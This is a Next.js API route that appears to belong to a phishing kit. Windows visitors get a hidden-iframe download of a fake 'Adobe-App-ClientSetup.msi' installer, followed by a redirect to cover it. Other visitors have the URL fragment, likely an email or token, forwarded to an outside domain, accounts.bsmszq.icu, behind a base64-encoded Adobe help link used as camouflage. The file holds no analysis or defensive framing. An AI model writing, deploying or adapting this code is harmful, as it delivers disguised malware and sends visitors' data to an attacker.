// pages/api/redirect.js
export default function handler(req, res) {
  const userAgent = req.headers["user-agent"] || "";
  const isWindows = /windows/i.test(userAgent);

  if (isWindows) {
    // HTML page that triggers a file download and then redirects
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="UTF-8">
          <title>Download</title>
        </head>
        <body>
          <p>Your download will start shortly...</p>
          <script>
            // Trigger download via hidden iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = '/Adobe-App-ClientSetup.msi';  // must exist in /public
            document.body.appendChild(iframe);

            // Redirect after delay
            setTimeout(() => {
              window.location.href = 'https://your-safe-domain.com/after-download';
            }, 3000);
          </script>
        </body>
      </html>
    `;
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.status(200).send(html);

  } else {
    // Non-Windows: grab hash and forward it
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="UTF-8">
          <title>Redirecting…</title>
        </head>
        <body>
          <p>Redirecting…</p>
          <script>
            var hash = window.location.hash;
            if (hash) {
              const parts = hash.split('#');
              const value = parts[1];
              window.location.href = "https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=" + encodeURIComponent(value);
            } else {
              window.location.href = "https://your-safe-domain.com/welcome";
            }
          </script>
        </body>
      </html>
    `;
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.status(200).send(html);
  }
}
